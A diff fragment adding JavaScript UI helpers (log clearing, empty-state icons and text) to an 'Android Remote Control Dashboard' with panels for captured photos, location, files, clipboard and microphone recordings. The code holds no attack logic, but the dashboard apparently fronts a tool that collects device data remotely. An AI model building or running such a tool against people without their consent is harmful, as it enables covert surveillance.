+function clearMessages() {
+  const logArea = document.getElementById("android-live-log")
+  if (logArea) {
+    logArea.textContent = "No messages yet..."
+    
+    // Reset message counter if exists
+    const messageCounter = document.getElementById("message-counter")
+    if (messageCounter) {
+      messageCounter.textContent = "0"
+    }
+  }
+  showNotification("Messages cleared", "info")
+}
+
+function getEmptyStateIcon(containerId) {
+  const iconMap = {
+    "photo-results": "camera",
+    "location-results": "map-marker-alt",
+    "file-results": "folder-open",
+    "text-results": "file-text",
+    "clipboard-results": "clipboard",
+    "microphone-results": "microphone",
+  }
+  return iconMap[containerId] || "file"
+}
+
+function getEmptyStateText(containerId) {
+  const textMap = {
+    "photo-results": "No photos captured yet",
+    "location-results": "No location data available",
+    "file-results": "No files retrieved yet",
+    "text-results": "No text data available",
+    "clipboard-results": "No clipboard data available",
+    "microphone-results": "No audio recordings yet",
+  }
+  return textMap[containerId] || "No data available"
+}
+
+// Initialize app when DOM is loaded
+document.addEventListener("DOMContentLoaded", () => {
+  console.log("Android Remote Control Dashboard initialized")
+})
